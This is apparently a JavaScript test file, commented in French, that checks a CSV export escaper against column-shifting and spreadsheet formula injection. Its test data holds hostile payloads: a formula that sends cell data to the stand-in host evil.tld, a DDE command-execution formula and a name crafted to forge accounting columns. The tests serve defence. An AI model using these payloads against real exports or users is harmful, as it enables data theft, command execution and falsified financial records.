import { describe, it, expect } from "vitest";
import { csvCell, csvRow } from "../utils/csv.js";

// Failles CSV corrigées (audit sécurité 2026-09). Les valeurs exportées
// proviennent de champs que l'ATTAQUANT contrôle : son propre nom, son e-mail,
// le titre d'une annonce. Deux problèmes distincts :
//
//  1. DÉCALAGE DE COLONNES — l'export partenaire faisait un simple join(","),
//     sans guillemets. Un client réservant sous un nom contenant des virgules
//     et des guillemets décalait toute sa ligne dans la COMPTABILITÉ du
//     partenaire : montant, commission, net partenaire et statut « payé »
//     falsifiés dans le fichier qui lui sert de justificatif.
//
//  2. INJECTION DE FORMULE — un tableur évalue toute cellule débutant par
//     =, +, -, @, TAB ou CR. Présente même dans l'export admin, qui doublait
//     pourtant correctement les guillemets.


// Analyseur CSV minimal conforme (RFC 4180) : guillemets doublés à l'intérieur
// d'un champ encadré. Sert à vérifier qu'une charge utile reste bien confinée
// dans UNE cellule au lieu de créer de nouvelles colonnes.
function parseCsvLine(line) {
  const out = [];
  let cur = "", inQuotes = false;
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (inQuotes) {
      if (c === '"' && line[i + 1] === '"') { cur += '"'; i++; }
      else if (c === '"') inQuotes = false;
      else cur += c;
    } else if (c === '"') inQuotes = true;
    else if (c === ",") { out.push(cur); cur = ""; }
    else cur += c;
  }
  out.push(cur);
  return out;
}

describe("Export CSV — échappement", () => {
  it("empêche le décalage de colonnes par virgules et guillemets", () => {
    const nomMalveillant = 'X","",999999,0,0,0,USD,2020-01-01,Oui';
    const ligne = csvRow(["REF-1", "location", "completed", nomMalveillant, 45000, 6750]);

    // La charge utile doit tenir dans UNE seule cellule : on relit la ligne
    // avec un analyseur CSV conforme (RFC 4180) plutôt qu'à l'œil.
    const champs = parseCsvLine(ligne);
    expect(champs.length, "le nombre de colonnes doit rester celui attendu").toBe(6);
    expect(champs[3], "le nom doit être restitué à l'identique, dans sa cellule").toBe(nomMalveillant);
    expect(champs[4]).toBe("45000");
  });

  it("neutralise les formules de tableur", () => {
    const formules = [
      '=HYPERLINK("https://evil.tld/x?d="&A1&B1,"Voir")',
      "=cmd|'/C calc'!A0",
      "+1+1",
      "-1+1",
      "@SUM(A1:A9)",
      "\tinjection",
    ];
    for (const f of formules) {
      const cell = csvCell(f);
      // La valeur est neutralisée : elle ne peut plus commencer par un
      // déclencheur de formule une fois la cellule ouverte.
      const contenu = cell.startsWith('"') ? cell.slice(1) : cell;
      expect(contenu.startsWith("'"), `formule non neutralisée : ${f}`).toBe(true);
    }
  });

  it("laisse les valeurs ordinaires intactes et lisibles", () => {
    expect(csvCell("Toyota Corolla")).toBe("Toyota Corolla");
    expect(csvCell(45000)).toBe("45000");
    expect(csvCell(null)).toBe("");
    expect(csvCell("jean@example.test")).toBe("jean@example.test");
    // Une virgule légitime reste correctement encadrée, sans être altérée.
    expect(csvCell("Toyota Land Cruiser, 7 places")).toBe('"Toyota Land Cruiser, 7 places"');
  });

  it("gère les sauts de ligne sans casser le fichier", () => {
    const cell = csvCell("ligne1\nligne2");
    expect(cell.startsWith('"')).toBe(true);
    expect(cell.endsWith('"')).toBe(true);
  });
});
